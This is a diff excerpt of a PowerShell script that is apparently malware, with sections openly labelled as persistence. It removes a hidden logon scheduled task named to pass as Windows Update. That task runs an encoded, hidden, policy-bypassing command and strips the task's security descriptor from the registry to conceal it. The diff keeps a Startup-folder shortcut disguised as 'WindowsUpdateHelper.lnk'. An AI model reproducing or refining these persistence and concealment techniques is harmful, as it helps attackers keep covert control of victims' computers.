@@ -21,25 +21,7 @@ function Save-ScriptToDisk {
 }
 $scriptPath = Save-ScriptToDisk $localPath
 
-# === PERSISTENCE: Scheduled Task ===
-$taskName = "WindowsUpdateTask"
-if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
-    try {
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $enc"
-        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 1)
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-        try {
-            $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
-            if (Test-Path $taskPath) { 
-                Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop
-            }
-        } catch {}
-    } catch {}
-}
-
-# === PERSISTENCE: Startup LNK ===
+# === PERSISTENCE: Startup LNK ONLY ===
 $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
     try {
